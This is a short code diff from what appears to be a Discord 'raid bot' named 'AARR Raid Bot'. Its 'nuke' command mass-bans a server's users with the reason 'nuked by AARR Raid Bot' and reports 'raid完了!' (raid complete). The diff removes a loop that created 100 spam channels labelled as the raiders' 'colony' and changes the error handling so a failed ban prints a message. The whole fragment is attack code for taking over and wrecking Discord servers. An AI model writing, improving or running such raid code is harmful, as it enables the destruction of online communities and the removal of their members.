@@ -19,9 +19,7 @@ async def nuke(ctx,guild: discord.Guild):
     try:
       await user.ban(reason="nuked by AARR Raid Bot")
     except:
-      return
-  for createchannel in range(100):
-      await guild.create_text_channel(f"AARRの植民地{random.choice(range(0,100000000000))}")
+      print("banできなかった")
   await ctx.reply(f"raid完了!")
 
 
